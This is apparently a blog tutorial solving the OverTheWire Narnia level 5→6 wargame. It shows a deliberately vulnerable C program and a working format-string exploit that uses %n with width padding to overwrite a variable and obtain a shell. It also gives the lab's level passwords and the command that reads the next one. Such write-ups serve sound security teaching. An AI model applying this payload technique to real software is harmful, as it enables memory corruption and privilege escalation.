---
date: 2023-08-23 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Narnia Level 5 → 6 tutorial!!"
permalink: /posts/Over-The-Wire-Narnia-Level-5-to-6/
tags: [overthewire, narnia, pwn, format-string, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Narnia Level 5 → 6!!"
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Narnia level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Narnia-Level-4-to-5/' | relative_url }}">← Previous: Level 4 → 5</a>
  </div>
  <div class="nav-center">
    <a href="https://overthewire.org/wargames/narnia/narnia6.html" target="_blank" rel="noopener">Official (Level 6) ↗</a>
  </div>
  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Narnia-Level-6-to-7/' | relative_url }}">Next: Level 6 → 7 →</a>
  </div>
</nav>

## Login

Use the password from **Level 4 → 5** (in my run it was `faimahchiy`):

```bash
ssh narnia5@narnia.labs.overthewire.org -p 2226
# password: faimahchiy
````

---

## Task

Binary: **`/narnia/narnia5`**

The program uses **`snprintf`** with user input but doesn’t provide a format string — opening up a **format string vulnerability**.

Goal: overwrite variable **`i`** from `1` to **`500`**.
The program even leaks the address of `i`.

---

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
    int i = 1;
    char buffer[64];

    snprintf(buffer, sizeof buffer, argv[1]);
    buffer[sizeof(buffer) - 1] = 0;
    printf("Change i's value from 1 -> 500. ");

    if(i==500){
        printf("GOOD\n");
        setreuid(geteuid(), geteuid());
        system("/bin/sh");
    }

    printf("No way...let me give you a hint!\n");
    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
    printf("i = %d (%p)\n", i, &i);
    return 0;
}
```

### Key Observations

* `snprintf` directly takes **argv\[1]** as the format string.
* With `%n`, we can write the number of printed characters into an arbitrary memory location.
* Address of `i` is conveniently leaked.

---

## Exploitation Steps

### 1. Confirm vulnerability

```bash
./narnia5 %x.%x.%x
# Change i's value from 1 -> 500...
# buffer : [f7fc5000.30303035.333032e] (26)
# i = 1 (0xffffd6d0)
```

✅ Classic format string issue confirmed.

---

### 2. Locate our write

We want to write **500** into `i` (`0xffffd6d0` in my run).
Trick: prepend the address, then use `%n`.

```bash
./narnia5 $(python3 -c 'print("\xd0\xd6\xff\xff" + "%1$n")')
# segfaults (writes 4 only, because "AAAA" length = 4)
```

So we need **padding**.

---

### 3. Use width specifier to reach 500

Instead of printing just a few chars, we pad output until its length = **500**.

```bash
./narnia5 $(python3 -c 'print("\xd0\xd6\xff\xff" + "%496x%1$n")')
```

---

### 4. Profit

```bash
Change i's value from 1 -> 500. GOOD
whoami
# narnia6
cat /etc/narnia_pass/narnia6
# <next password>
```

---

## Password

From my run:

```
neezoceaeng
```

---

## Quick One-liner

```bash
./narnia5 $(python3 -c 'print("\xd0\xd6\xff\xff" + "%496x%1$n")')
```

---

## Troubleshooting

* **Wrong address?** The leaked `i` may differ each run. Always use the address shown by the program (`i = 1 (0x…)`).
* **Segmentation fault immediately?** Ensure little-endian byte order when injecting address.
* **Not writing 500?** Adjust the padding: `%<value-4>x%1$n`.

---

**Congrats 🎉** You just exploited a **format string vulnerability** to overwrite memory. Onward to **Level 6 → 7**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

